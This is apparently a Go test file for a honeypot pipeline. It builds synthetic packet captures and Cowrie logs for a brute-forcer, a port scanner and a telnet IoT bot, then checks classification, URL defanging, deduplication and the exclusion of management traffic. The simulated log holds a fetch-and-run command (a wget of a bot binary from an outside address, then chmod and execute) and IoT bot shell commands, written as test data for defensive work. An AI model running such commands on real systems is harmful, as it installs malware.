package pipeline

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcapgo"

	"github.com/pcaphub/flypaper/internal/classify"
	"github.com/pcaphub/flypaper/internal/config"
	"github.com/pcaphub/flypaper/internal/state"
)

var (
	honeypot = net.ParseIP("203.0.113.10")
	bruter   = net.ParseIP("198.51.100.7")
	scanner  = net.ParseIP("198.51.100.8")
	intruder = net.ParseIP("198.51.100.9")
	mgmt     = net.ParseIP("192.0.2.1")
	t0       = time.Date(2026, 11, 17, 9, 0, 0, 0, time.UTC)
)

// synth writes a pcap with three attackers plus management traffic, and the
// Cowrie log that goes with it. Returns the ring dir and the cowrie path.
func synth(t *testing.T) (string, string) {
	t.Helper()
	dir := t.TempDir()
	ring := filepath.Join(dir, "ring")
	logs := filepath.Join(dir, "cowrie")
	if err := os.MkdirAll(ring, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(logs, 0o750); err != nil {
		t.Fatal(err)
	}

	f, err := os.Create(filepath.Join(ring, "ring_00001_20261117090000.pcap"))
	if err != nil {
		t.Fatal(err)
	}
	w := pcapgo.NewWriter(f)
	if err := w.WriteFileHeader(262144, layers.LinkTypeEthernet); err != nil {
		t.Fatal(err)
	}
	var cowrie []map[string]any
	ts := func(d time.Duration) string { return t0.Add(d).Format("2006-01-02T15:04:05.000000Z") }

	// 1. brute force: 60 short SSH connections from bruter, each 6 packets,
	//    the 55th logs in and runs three commands with a wget.
	for i := 0; i < 60; i++ {
		at := t0.Add(time.Duration(i) * 3 * time.Second)
		sport := 40000 + i
		sess := fmt.Sprintf("b%02d", i)
		writeFlow(t, w, at, bruter, sport, honeypot, 22, 6)
		cowrie = append(cowrie,
			ev("cowrie.session.connect", ts(time.Duration(i)*3*time.Second), bruter, sport, sess, nil),
		)
		if i == 54 {
			cowrie = append(cowrie,
				ev("cowrie.login.success", ts(time.Duration(i)*3*time.Second+time.Second), bruter, sport, sess, map[string]any{"username": "root", "password": "admin123"}),
				ev("cowrie.command.input", ts(time.Duration(i)*3*time.Second+1500*time.Millisecond), bruter, sport, sess, map[string]any{"input": "cd /tmp; wget http://45.33.32.156/bins/x86_64.bot -O .x8f2k1; chmod +x .x8f2k1; ./.x8f2k1"}),
				ev("cowrie.session.file_download", ts(time.Duration(i)*3*time.Second+1600*time.Millisecond), bruter, sport, sess, map[string]any{"url": "http://45.33.32.156/bins/x86_64.bot", "shasum": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}),
				ev("cowrie.command.input", ts(time.Duration(i)*3*time.Second+2*time.Second), bruter, sport, sess, map[string]any{"input": "uname -a"}),
			)
		} else {
			cowrie = append(cowrie,
				ev("cowrie.login.failed", ts(time.Duration(i)*3*time.Second+time.Second), bruter, sport, sess, map[string]any{"username": "root", "password": fmt.Sprintf("pass%d", i%7)}),
			)
		}
	}

	// 2. port sweep: 12 ports, 2 packets each, from scanner
	for i, port := range []int{21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 8080} {
		writeFlow(t, w, t0.Add(10*time.Minute+time.Duration(i)*200*time.Millisecond), scanner, 50000+i, honeypot, port, 2)
	}

	// 3. telnet IoT bot: one connection, login, commands (no download)
	writeFlow(t, w, t0.Add(20*time.Minute), intruder, 51000, honeypot, 23, 40)
	cowrie = append(cowrie,
		ev("cowrie.session.connect", ts(20*time.Minute), intruder, 51000, "t01", map[string]any{"protocol": "telnet", "dst_port": 23}),
		ev("cowrie.login.success", ts(20*time.Minute+time.Second), intruder, 51000, "t01", map[string]any{"username": "admin", "password": "1234", "protocol": "telnet"}),
		ev("cowrie.command.input", ts(20*time.Minute+2*time.Second), intruder, 51000, "t01", map[string]any{"input": "enable", "protocol": "telnet"}),
		ev("cowrie.command.input", ts(20*time.Minute+3*time.Second), intruder, 51000, "t01", map[string]any{"input": "sh", "protocol": "telnet"}),
		ev("cowrie.command.input", ts(20*time.Minute+4*time.Second), intruder, 51000, "t01", map[string]any{"input": "cat /proc/mounts; /bin/busybox ZORRO", "protocol": "telnet"}),
	)

	// 4. management SSH on 2222 from mgmt: must never appear
	writeFlow(t, w, t0.Add(30*time.Minute), mgmt, 60000, honeypot, 2222, 50)

	f.Close()

	lf, err := os.Create(filepath.Join(logs, "cowrie.json"))
	if err != nil {
		t.Fatal(err)
	}
	enc := json.NewEncoder(lf)
	for _, e := range cowrie {
		_ = enc.Encode(e)
	}
	lf.Close()
	// make the ring file old enough to count as closed
	old := time.Now().Add(-time.Hour)
	_ = os.Chtimes(filepath.Join(ring, "ring_00001_20261117090000.pcap"), old, old)
	return ring, filepath.Join(logs, "cowrie.json")
}

func ev(id, ts string, ip net.IP, sport int, sess string, extra map[string]any) map[string]any {
	m := map[string]any{
		"eventid": id, "timestamp": ts, "src_ip": ip.String(), "src_port": sport,
		"dst_ip": honeypot.String(), "dst_port": 22, "session": sess, "protocol": "ssh",
	}
	for k, v := range extra {
		m[k] = v
	}
	return m
}

// writeFlow emits a plausible TCP exchange: SYN, SYN/ACK, then alternating
// data packets.
func writeFlow(t *testing.T, w *pcapgo.Writer, at time.Time, src net.IP, sport int, dst net.IP, dport int, n int) {
	t.Helper()
	for i := 0; i < n; i++ {
		fromRemote := i%2 == 0
		eth := &layers.Ethernet{SrcMAC: net.HardwareAddr{0, 1, 2, 3, 4, 5}, DstMAC: net.HardwareAddr{6, 7, 8, 9, 10, 11}, EthernetType: layers.EthernetTypeIPv4}
		ip := &layers.IPv4{Version: 4, TTL: 64, Protocol: layers.IPProtocolTCP, SrcIP: src, DstIP: dst}
		tcp := &layers.TCP{SrcPort: layers.TCPPort(sport), DstPort: layers.TCPPort(dport), SYN: i == 0, ACK: i > 0, Seq: uint32(1000 + i), Window: 65535}
		payload := []byte{}
		if !fromRemote {
			ip.SrcIP, ip.DstIP = dst, src
			tcp.SrcPort, tcp.DstPort = layers.TCPPort(dport), layers.TCPPort(sport)
		}
		if i > 1 {
			payload = []byte(fmt.Sprintf("SSH-2.0-payload-%d-%s", i, string(make([]byte, 40))))
		}
		_ = tcp.SetNetworkLayerForChecksum(ip)
		buf := gopacket.NewSerializeBuffer()
		if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, eth, ip, tcp, gopacket.Payload(payload)); err != nil {
			t.Fatal(err)
		}
		ci := gopacket.CaptureInfo{Timestamp: at.Add(time.Duration(i) * 50 * time.Millisecond), CaptureLength: len(buf.Bytes()), Length: len(buf.Bytes())}
		if err := w.WritePacket(ci, buf.Bytes()); err != nil {
			t.Fatal(err)
		}
	}
}

func testConfig(t *testing.T, ring, cowrie string) config.Config {
	cfg := config.Default()
	cfg.Name = "test-1"
	cfg.Region = "eu-test"
	cfg.DryRun = true
	cfg.Capture.Dir = ring
	cfg.Capture.MinAge = time.Minute
	cfg.Capture.ExcludePorts = []int{2222}
	cfg.Capture.LocalIPs = []string{honeypot.String()}
	cfg.Logs.Cowrie = cowrie
	cfg.StateDir = filepath.Join(t.TempDir(), "state")
	cfg.Outbox = filepath.Join(t.TempDir(), "outbox")
	cfg.Select.KeepAttempts = 10
	return cfg
}

func TestDryRunEndToEnd(t *testing.T) {
	ring, cowrie := synth(t)
	cfg := testConfig(t, ring, cowrie)
	st, err := state.Open(cfg.StateDir)
	if err != nil {
		t.Fatal(err)
	}
	p := &Pipeline{Cfg: cfg, State: st, Log: slog.New(slog.NewTextHandler(os.Stderr, nil))}
	sum, err := p.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if sum.Files != 1 {
		t.Fatalf("files = %d", sum.Files)
	}
	// bruter, scanner, intruder; management excluded
	if sum.Sessions != 3 {
		t.Fatalf("sessions = %d, want 3 (management traffic must be excluded): %+v", sum.Sessions, sum.Skipped)
	}
	byRemote := map[string]Candidate{}
	for _, c := range sum.Candidates {
		byRemote[c.Session.Remote.String()] = c
		if c.Session.Remote.Equal(mgmt) {
			t.Fatal("management peer leaked into a slice")
		}
	}

	b := byRemote[bruter.String()]
	if b.Result.Class != classify.MalwareDownload {
		t.Errorf("bruter class = %s, want %s (facts %+v)", b.Result.Class, classify.MalwareDownload, b.Result.Facts)
	}
	if b.Decision != "upload" {
		t.Errorf("bruter decision = %s", b.Decision)
	}
	// 60 flows trimmed to the first 10 plus the one that logged in
	if got := len(b.Session.Packets); got != 11*6 {
		t.Errorf("bruter packets after trim = %d, want %d", got, 11*6)
	}
	if !b.Session.Truncated {
		t.Error("bruter slice should be marked truncated")
	}
	if b.Result.Facts.LoginAttempts != 60 || len(b.Result.Facts.LoginSuccess) != 1 {
		t.Errorf("login facts: attempts=%d success=%v", b.Result.Facts.LoginAttempts, b.Result.Facts.LoginSuccess)
	}
	if len(b.Result.Facts.URLs) != 1 {
		t.Errorf("urls = %v", b.Result.Facts.URLs)
	}
	if !contains(b.Meta.Description, "hxxp://45[.]33[.]32[.]156/bins/x86_64.bot") {
		t.Errorf("description not defanged:\n%s", b.Meta.Description)
	}
	if contains(b.Meta.Description, "http://45.33") {
		t.Error("raw URL leaked into description")
	}

	s := byRemote[scanner.String()]
	if s.Result.Class != classify.ScanOnly {
		t.Errorf("scanner class = %s", s.Result.Class)
	}
	if s.Decision != "baseline" {
		t.Errorf("scanner decision = %s, want baseline (first low-score scenario of the day)", s.Decision)
	}
	if len(s.Session.LocalPorts) != 12 {
		t.Errorf("scanner ports = %v", s.Session.LocalPorts)
	}

	i := byRemote[intruder.String()]
	if i.Result.Class != classify.TelnetIoT {
		t.Errorf("intruder class = %s (services %v)", i.Result.Class, i.Result.Facts.Services)
	}
	if i.Decision != "upload" {
		t.Errorf("intruder decision = %s", i.Decision)
	}

	// outbox has a pcap and a json per upload
	entries, _ := os.ReadDir(cfg.Outbox)
	if len(entries) != 6 {
		t.Errorf("outbox entries = %d, want 6", len(entries))
	}
	if sum.Uploaded != 2 || sum.Baseline != 1 {
		t.Errorf("uploaded=%d baseline=%d", sum.Uploaded, sum.Baseline)
	}

	// second pass: nothing new (file processed), state persisted
	sum2, err := p.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if sum2.Files != 0 {
		t.Errorf("second pass reprocessed %d files", sum2.Files)
	}
}

// The same scenario from a new address on a later file must be counted, not
// uploaded again; a scan from a second address is a repeat too.
func TestRepeatScenarioIsDeduplicated(t *testing.T) {
	ring, cowrie := synth(t)
	cfg := testConfig(t, ring, cowrie)
	st, _ := state.Open(cfg.StateDir)
	p := &Pipeline{Cfg: cfg, State: st, Log: slog.New(slog.NewTextHandler(os.Stderr, nil))}
	if _, err := p.Run(context.Background()); err != nil {
		t.Fatal(err)
	}

	// second ring file: the same telnet bot script from a different IP
	other := net.ParseIP("198.51.100.77")
	f, _ := os.Create(filepath.Join(ring, "ring_00002_20261117100000.pcap"))
	w := pcapgo.NewWriter(f)
	_ = w.WriteFileHeader(262144, layers.LinkTypeEthernet)
	at := t0.Add(2 * time.Hour)
	writeFlow(t, w, at, other, 52000, honeypot, 23, 40)
	f.Close()
	old := time.Now().Add(-time.Hour)
	_ = os.Chtimes(f.Name(), old, old)

	lf, _ := os.OpenFile(cowrie, os.O_APPEND|os.O_WRONLY, 0o640)
	enc := json.NewEncoder(lf)
	ts := func(d time.Duration) string { return at.Add(d).Format("2006-01-02T15:04:05.000000Z") }
	for _, e := range []map[string]any{
		ev("cowrie.session.connect", ts(0), other, 52000, "t02", map[string]any{"protocol": "telnet", "dst_port": 23}),
		ev("cowrie.login.success", ts(time.Second), other, 52000, "t02", map[string]any{"username": "admin", "password": "1234", "protocol": "telnet"}),
		ev("cowrie.command.input", ts(2*time.Second), other, 52000, "t02", map[string]any{"input": "enable", "protocol": "telnet"}),
		ev("cowrie.command.input", ts(3*time.Second), other, 52000, "t02", map[string]any{"input": "sh", "protocol": "telnet"}),
		ev("cowrie.command.input", ts(4*time.Second), other, 52000, "t02", map[string]any{"input": "cat /proc/mounts; /bin/busybox ZORRO", "protocol": "telnet"}),
	} {
		_ = enc.Encode(e)
	}
	lf.Close()

	sum, err := p.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if sum.Sessions != 1 || sum.Uploaded != 0 {
		t.Fatalf("sessions=%d uploaded=%d skipped=%v", sum.Sessions, sum.Uploaded, sum.Skipped)
	}
	c := sum.Candidates[0]
	if c.Decision != "repeat" {
		t.Errorf("decision = %s, want repeat", c.Decision)
	}
	sc := st.Scenario(c.Result.Fingerprint)
	if sc == nil || sc.Seen != 2 || sc.IPCount != 2 {
		t.Errorf("scenario record = %+v", sc)
	}
	if !contains(c.Meta.Description, "seen 2 times from 2 addresses") {
		t.Errorf("prevalence line missing:\n%s", c.Meta.Description)
	}
}

func contains(s, sub string) bool { return len(s) >= len(sub) && (func() bool { return indexOf(s, sub) >= 0 })() }

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
